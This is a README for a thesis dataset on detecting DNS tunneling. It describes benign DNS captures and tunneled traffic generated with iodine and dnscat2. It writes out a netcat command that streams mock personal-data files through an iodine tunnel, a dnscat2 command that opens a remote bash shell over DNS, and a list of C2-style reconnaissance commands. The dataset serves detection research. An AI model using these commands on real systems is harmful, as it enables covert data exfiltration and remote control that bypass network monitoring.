# SWE450-Thesis

---

# 📁 DNS Dataset – Collection Summary

This repository contains both **Benign** and **Malign (Tunneled)** DNS traffic samples captured for DNS tunneling detection research.
All datasets were collected as **PCAP files**, then converted into **CSV** and **JSON** formats for analysis.

---

## 🟢 1. Benign DNS Traffic (Normal)

### **How the benign dataset was generated**

A custom Python script `generate_dns.py` continuously sent legitimate DNS queries (A/AAAA lookups) to public DNS resolvers such as **1.1.1.1** and **8.8.8.8**.
The script produced realistic system-like and browsing-like DNS activity.

While the script ran, `tcpdump` captured all outgoing DNS packets, producing:

* `normal_dns.pcap`
* `normal_dns_full.csv`
* `normal_dns.json`

This dataset represents **clean, untunneled DNS behavior**.

---

## 🔴 2. Malign DNS Traffic (Tunneled)

Malicious DNS traffic was generated using two tunneling tools: **iodine** and **dnscat2**, each producing distinct tunneling characteristics.

---

## 2.1 – **Tunneling Using iodine**

### **Data generation method**

1. Synthetic personal-like datasets were generated using **Mockaroo** ([https://mockaroo.com](https://mockaroo.com)), containing:

   * Names
   * Emails
   * Phone numbers
   * Addresses
   * IPs
   * Base64-like strings
   * Mixed text

2. Files generated:

   * `mock_personal_data.csv`
   * `null_data.csv`
   * `txt_data.csv`
   * `mixed_data.csv`

3. During an active iodine DNS tunnel, the CSV data was streamed through the tunnel using:

```bash
cat null_data.csv | nc 10.0.0.1 9090
cat txt_data.csv | nc 10.0.0.1 9090
```

4. `tcpdump` captured all tunneled packets (NULL, TXT, MIXED).

### **Output files**

* `null_dataset.pcap`
* `null_dataset_full.csv`
* `null_dataset.json`
* `txt_dataset_full.pcap`
* `txt_dataset_full.csv`
* `txt_dataset.json`

These represent **iodine-style bulk data exfiltration over DNS**.

---

## 2.2 – **Tunneling Using dnscat2**

### **Data generation method**

1. A dnscat2 server was run on the authoritative DNS server.
2. The client connected using encrypted DNS tunnel mode with a shared secret.
3. A dummy data generator script (`generate_dummy_data.sh`) was used to produce random strings, base64-like chunks, numbers, etc.
4. A full interactive remote shell was spawned using:

```bash
dnscat --dns=domain=tunnel.devgossips.me --exec=/bin/bash --secret=<KEY>
```

5. The server executed typical C2-style shell commands:

```
ls
pwd
whoami
uname -a
id
ps aux | head -n 5
df -h | head -n 3
cat /etc/hostname
```

These commands produced encrypted tunneling activity, encoded inside DNS query/response packets.

### **Output files**

* `dnscat2_session.pcap`
* `dnscat2_session.json`
* `dnscat2_full.csv`

This dataset represents **C2-style interactive DNS tunneling**.

---

# ⚖️ Iodine vs dnscat2 – Behavioral Comparison

| Feature                     | **iodine**                            | **dnscat2**                                         |
| --------------------------- | ------------------------------------- | --------------------------------------------------- |
| **Primary Purpose**         | IP-over-DNS tunneling (network-level) | Encrypted C2 framework over DNS (application-level) |
| **Record Types Used**       | Mostly `NULL`, sometimes `TXT`        | `TXT`, `CNAME`, `MX` (highly variable)              |
| **Traffic Pattern**         | Bulk sequential chunks                | Small, frequent, encrypted packets                  |
| **Payload Structure**       | Chunked raw data (base32/base64)      | Encrypted command packets + session metadata        |
| **Typical Usage**           | Data exfiltration, VPN-like tunneling | Remote shell, command execution, covert C2          |
| **Packet Size Consistency** | Often large and uniform               | Highly variable depending on command output         |
| **Metadata Leakage**        | Minimal (raw payloads)                | Rich (window events, ACKs, control frames)          |
| **Detectability**           | Easier (NULL records uncommon)        | Harder (looks like many random TXT queries)         |

This comparison helps distinguish tunneling strategies during model training.

---

# 📦 Dataset Folder Structure

```
DNS_Dataset/
│
├── .venv/
│
├── Benign/
│   ├── normal_dns_full.csv
│   ├── normal_dns.json
│   └── normal_dns.pcap
│
├── Malign/
│   ├── dnscat2/
│   │   ├── dnscat2_full.csv
│   │   ├── dnscat2_session.json
│   │   ├── dnscat2_session.pcap
│   │   └── generate_dummy_data.sh
│   │
│   └── iodine/
│       ├── mock_personal_data.csv
│       ├── null_dataset_full.csv
│       ├── null_dataset_full.json
│       ├── null_dataset.csv
│       ├── null_dataset.json
│       ├── null_dataset.pcap
│       ├── txt_dataset_full.csv
│       ├── txt_dataset_full.pcap
│       └── txt_dataset.json
│
├── venv/
│
├── generate_dns.py
├── json_to_csv.py
├── .gitignore
└── README.md
```

---

# ✔ Summary

* **Benign DNS traffic** collected using random domain queries.
* **Iodine** used for bulk exfiltration tunneling with Mockaroo-generated personal-style data.
* **Dnscat2** used for encrypted command-and-control tunneling + interactive remote shell.
* All data captured using **tcpdump**, converted to CSV/JSON for machine learning.

---
